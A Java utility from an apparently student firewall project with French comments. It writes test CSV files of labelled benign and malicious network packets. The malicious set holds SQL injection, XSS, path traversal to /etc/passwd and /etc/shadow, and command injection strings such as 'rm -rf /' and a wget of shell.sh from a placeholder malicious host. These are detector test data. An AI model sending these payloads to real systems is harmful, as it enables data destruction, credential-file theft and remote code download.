/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.parfeu.Model.Mahran.generator;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Utilitaire pour créer les fichiers CSV de paquets.
 * À exécuter UNE SEULE FOIS pour initialiser les fichiers.
 * 
 */
public class CSVPacketFilesCreator {
    
    /**
     * Crée le fichier de paquets sains.
     */
    public static void createBenignPacketsFile() throws Exception {
        Path path = Paths.get("paquets_sains.csv");
        
        try (BufferedWriter writer = new BufferedWriter(
                new OutputStreamWriter(
                    new FileOutputStream(path.toFile()),
                    StandardCharsets.UTF_8
                )
             )) {
            
            // En-tête
            writer.write("srcIP,destIP,srcPort,destPort,protocol,payload\n");
            
            // 30 paquets sains variés
            
            // Trafic web normal (HTTP/HTTPS)
            writer.write("192.168.1.10,203.0.113.10,54321,80,HTTP,GET /index.html HTTP/1.1\n");
            writer.write("192.168.1.20,203.0.113.10,54322,443,HTTPS,GET /api/users HTTP/1.1\n");
            writer.write("192.168.1.30,203.0.113.10,54323,80,HTTP,POST /login HTTP/1.1\n");
            writer.write("192.168.1.40,203.0.113.10,54324,443,HTTPS,GET /dashboard HTTP/1.1\n");
            writer.write("192.168.1.50,203.0.113.10,54325,80,HTTP,GET /images/logo.png HTTP/1.1\n");
            
            // Trafic email (SMTP/POP3)
            writer.write("192.168.1.15,203.0.113.20,54330,25,SMTP,MAIL FROM:<user@example.com>\n");
            writer.write("192.168.1.25,203.0.113.20,54331,110,POP3,USER john.doe\n");
            writer.write("192.168.1.35,203.0.113.20,54332,587,SMTP,EHLO mail.example.com\n");
            
            // Trafic FTP
            writer.write("192.168.1.45,203.0.113.30,54340,21,FTP,USER anonymous\n");
            writer.write("192.168.1.55,203.0.113.30,54341,21,FTP,RETR document.pdf\n");
            
            // Trafic SSH
            writer.write("10.0.0.5,203.0.113.40,54350,22,SSH,SSH-2.0-OpenSSH_8.2\n");
            writer.write("10.0.0.15,203.0.113.40,54351,22,SSH,SSH connection established\n");
            
            // Trafic DNS
            writer.write("192.168.1.100,8.8.8.8,54360,53,DNS,Query A example.com\n");
            writer.write("192.168.1.110,8.8.8.8,54361,53,DNS,Query AAAA google.com\n");
            
            // Trafic API REST
            writer.write("172.16.0.10,203.0.113.50,54370,8080,HTTP,GET /api/v1/products HTTP/1.1\n");
            writer.write("172.16.0.20,203.0.113.50,54371,8080,HTTP,POST /api/v1/orders HTTP/1.1\n");
            writer.write("172.16.0.30,203.0.113.50,54372,8080,HTTP,PUT /api/v1/users/123 HTTP/1.1\n");
            
            // Trafic base de données (MySQL)
            writer.write("192.168.1.200,203.0.113.60,54380,3306,TCP,SELECT name FROM products WHERE id=5\n");
            writer.write("192.168.1.210,203.0.113.60,54381,3306,TCP,UPDATE orders SET status='shipped' WHERE id=100\n");
            
            // Ping / ICMP
            writer.write("192.168.1.150,203.0.113.10,0,0,ICMP,Echo request\n");
            writer.write("192.168.1.160,203.0.113.10,0,0,ICMP,Echo reply\n");
            
            // Trafic multimédia
            writer.write("192.168.1.70,203.0.113.70,54390,1935,RTMP,Video stream request\n");
            writer.write("192.168.1.80,203.0.113.70,54391,554,RTSP,Audio stream connect\n");
            
            // Trafic CDN
            writer.write("192.168.1.90,203.0.113.80,54400,443,HTTPS,GET /cdn/assets/main.js HTTP/1.1\n");
            writer.write("192.168.1.95,203.0.113.80,54401,443,HTTPS,GET /cdn/images/banner.jpg HTTP/1.1\n");
            
            // Trafic cloud sync
            writer.write("10.0.0.100,203.0.113.90,54410,443,HTTPS,POST /sync/upload HTTP/1.1\n");
            writer.write("10.0.0.110,203.0.113.90,54411,443,HTTPS,GET /sync/download HTTP/1.1\n");
            
            // VPN
            writer.write("172.16.0.50,203.0.113.100,54420,1194,UDP,OpenVPN handshake\n");
            
            // Telnet
            writer.write("192.168.1.180,203.0.113.110,54430,23,TELNET,Login prompt\n");
            
            // NTP (Network Time Protocol)
            writer.write("192.168.1.190,203.0.113.120,54440,123,UDP,Time synchronization request\n");
            
            System.out.println("✓ Fichier 'paquets_sains.csv' créé avec 30 paquets");
        }
    }
    
    /**
     * Crée le fichier de paquets malicieux.
     */
    public static void createMaliciousPacketsFile() throws Exception {
        Path path = Paths.get("paquets_malicieux.csv");
        
        try (BufferedWriter writer = new BufferedWriter(
                new OutputStreamWriter(
                    new FileOutputStream(path.toFile()),
                    StandardCharsets.UTF_8
                )
             )) {
            
            // En-tête
            writer.write("srcIP,destIP,srcPort,destPort,protocol,payload,attackType\n");
            
            // 30 paquets malicieux variés
            
            // SQL Injection (10 variations)
            writer.write("192.168.1.100,203.0.113.10,55000,3306,TCP,SELECT * FROM users WHERE id=1 OR 1=1,SQL_INJECTION\n");
            writer.write("192.168.1.101,203.0.113.10,55001,3306,TCP,'; DROP TABLE users; --,SQL_INJECTION\n");
            writer.write("192.168.1.102,203.0.113.10,55002,3306,TCP,admin' OR '1'='1,SQL_INJECTION\n");
            writer.write("192.168.1.103,203.0.113.10,55003,3306,TCP,1' UNION SELECT password FROM admin--,SQL_INJECTION\n");
            writer.write("192.168.1.104,203.0.113.10,55004,3306,TCP,'; EXEC sp_msforeachtable 'DROP TABLE ?'; --,SQL_INJECTION\n");
            writer.write("192.168.1.105,203.0.113.10,55005,80,HTTP,/product?id=1' OR '1'='1' --,SQL_INJECTION\n");
            writer.write("192.168.1.106,203.0.113.10,55006,80,HTTP,/login?user=admin'--&pass=any,SQL_INJECTION\n");
            writer.write("192.168.1.107,203.0.113.10,55007,3306,TCP,SELECT LOAD_FILE('/etc/passwd'),SQL_INJECTION\n");
            writer.write("192.168.1.108,203.0.113.10,55008,3306,TCP,1'; DELETE FROM logs WHERE '1'='1,SQL_INJECTION\n");
            writer.write("192.168.1.109,203.0.113.10,55009,3306,TCP,' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --,SQL_INJECTION\n");
            
            // XSS (Cross-Site Scripting) (7 variations)
            writer.write("192.168.1.110,203.0.113.10,55010,80,HTTP,<script>alert('XSS')</script>,XSS\n");
            writer.write("192.168.1.111,203.0.113.10,55011,80,HTTP,<img src=x onerror=alert('XSS')>,XSS\n");
            writer.write("192.168.1.112,203.0.113.10,55012,80,HTTP,<body onload=alert('XSS')>,XSS\n");
            writer.write("192.168.1.113,203.0.113.10,55013,80,HTTP,<iframe src=javascript:alert('XSS')>,XSS\n");
            writer.write("192.168.1.114,203.0.113.10,55014,80,HTTP,<svg/onload=alert('XSS')>,XSS\n");
            writer.write("192.168.1.115,203.0.113.10,55015,80,HTTP,javascript:void(document.cookie),XSS\n");
            writer.write("192.168.1.116,203.0.113.10,55016,80,HTTP,<input onfocus=alert('XSS') autofocus>,XSS\n");
            
            // Path Traversal (5 variations)
            writer.write("192.168.1.120,203.0.113.10,55020,80,HTTP,GET ../../../../etc/passwd HTTP/1.1,PATH_TRAVERSAL\n");
            writer.write("192.168.1.121,203.0.113.10,55021,80,HTTP,GET ../../../windows/system32/config/sam HTTP/1.1,PATH_TRAVERSAL\n");
            writer.write("192.168.1.122,203.0.113.10,55022,80,HTTP,/download?file=....//....//etc/shadow,PATH_TRAVERSAL\n");
            writer.write("192.168.1.123,203.0.113.10,55023,21,FTP,RETR ../../../etc/passwd,PATH_TRAVERSAL\n");
            writer.write("192.168.1.124,203.0.113.10,55024,80,HTTP,/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd,PATH_TRAVERSAL\n");
            
            // Command Injection (4 variations)
            writer.write("192.168.1.130,203.0.113.10,55030,80,HTTP,; rm -rf /,COMMAND_INJECTION\n");
            writer.write("192.168.1.131,203.0.113.10,55031,80,HTTP,| cat /etc/passwd,COMMAND_INJECTION\n");
            writer.write("192.168.1.132,203.0.113.10,55032,80,HTTP,`whoami`,COMMAND_INJECTION\n");
            writer.write("192.168.1.133,203.0.113.10,55033,80,HTTP,$(wget malicious.com/shell.sh),COMMAND_INJECTION\n");
            
            // Port Scanning (2 variations)
            writer.write("192.168.1.140,203.0.113.10,55040,1,TCP,SYN scan probe,PORT_SCAN\n");
            writer.write("192.168.1.141,203.0.113.10,55041,65535,TCP,Full port range scan,PORT_SCAN\n");
            
            // DoS/DDoS (2 variations)
            writer.write("192.168.1.150,203.0.113.10,55050,80,HTTP,GET / HTTP/1.1 (flood attack - packet 1 of 10000),DOS\n");
            writer.write("192.168.1.151,203.0.113.10,55051,443,HTTPS,SYN flood attack,DOS\n");
            
            System.out.println("✓ Fichier 'paquets_malicieux.csv' créé avec 30 paquets");
        }
    }
    
    /**
     * Crée les deux fichiers CSV.
     */
    public static void createAllFiles() {
        try {
            System.out.println("\n╔══════════════════════════════════════════════════════════════╗");
            System.out.println("║     CRÉATION DES FICHIERS CSV DE PAQUETS                     ║");
            System.out.println("╚══════════════════════════════════════════════════════════════╝\n");
            
            createBenignPacketsFile();
            createMaliciousPacketsFile();
            
            System.out.println("\n✓ Tous les fichiers ont été créés avec succès !");
            System.out.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
            
        } catch (Exception e) {
            System.err.println("❌ Erreur lors de la création des fichiers : " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * Point d'entrée pour créer les fichiers.
     */
    public static void main(String[] args) {
        createAllFiles();
    }
}